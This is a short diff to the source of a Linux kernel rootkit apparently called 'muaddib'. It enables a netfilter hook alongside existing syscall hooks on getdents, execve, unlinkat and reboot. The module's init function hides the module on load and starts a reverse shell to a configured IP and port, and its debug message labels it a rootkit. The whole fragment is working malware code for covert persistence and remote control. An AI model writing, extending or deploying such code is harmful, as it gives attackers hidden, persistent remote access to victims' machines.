@@ -9,6 +9,7 @@
 #include "getdents_hook.c"
 #include "execve_hook.c"
 #include "unlinkat_hook.c"
+#include "netfilter_hook.c"
 
 #ifdef PTREGS_SYSCALL_STUBS
 static asmlinkage long (*og_reboot)(const struct pt_regs *);
@@ -36,8 +37,7 @@ static int __init muaddib_init(void){
 	int err;
     err = fh_install_hooks(hooks, ARRAY_SIZE(hooks));
     if(err){ return err; }
-	//err = register_netfilter_hook();
-	//if (err){ return err; }
+	reg_nf_hook();
 	hideme(); //hide on load
 	hidden = 1;
 	start_reverse_shell(REVERSE_SHELL_IP, REVERSE_SHELL_PORT);
@@ -49,7 +49,7 @@ static void __exit muaddib_cleanup(void){
 	showme();
 	hidden = 0;
     fh_remove_hooks(hooks, ARRAY_SIZE(hooks));
-	//unregister_netfilter_hook();
+	unreg_nf_hook();
 	#if DEBUGMSG == 1
     printk(KERN_INFO "rootkit: Unloaded :-(\n");
 	#endif
